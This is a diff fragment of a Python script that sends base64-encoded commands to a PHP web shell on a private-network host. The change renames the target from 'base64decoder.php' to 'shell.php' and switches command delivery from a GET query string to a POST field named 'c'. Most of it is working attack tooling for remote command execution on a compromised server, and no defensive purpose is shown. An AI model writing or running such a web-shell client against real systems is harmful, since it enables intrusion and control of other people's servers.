@@ -5,14 +5,14 @@ import requests
 
 SCHEME = "http"
 HOST = "10.143.4.133"
-PATH = "/includes/base64decoder.php"
+PATH = "/includes/shell.php"
 TIMEOUT = 5
 SEPARATOR = "=" * 60
 SUB_SEPARATOR = "-" * 60
 
 
-def build_url(encoded_cmd: str) -> str:
-    return f"{SCHEME}://{HOST}{PATH}?c={encoded_cmd}"
+def build_url() -> str:
+    return f"{SCHEME}://{HOST}{PATH}"
 
 
 def encode_cmd(cmd: str) -> str:
@@ -22,9 +22,9 @@ def encode_cmd(cmd: str) -> str:
 
 def send_command(cmd: str) -> Tuple[str, Optional[int]]:
     encoded = encode_cmd(cmd)
-    url = build_url(encoded)
+    url = build_url()
     try:
-        res = requests.get(url, timeout=TIMEOUT)
+        res = requests.post(url, data={"c": encoded}, timeout=TIMEOUT)
     except requests.exceptions.Timeout:
         return "request timed out", None
     except requests.exceptions.ConnectionError:
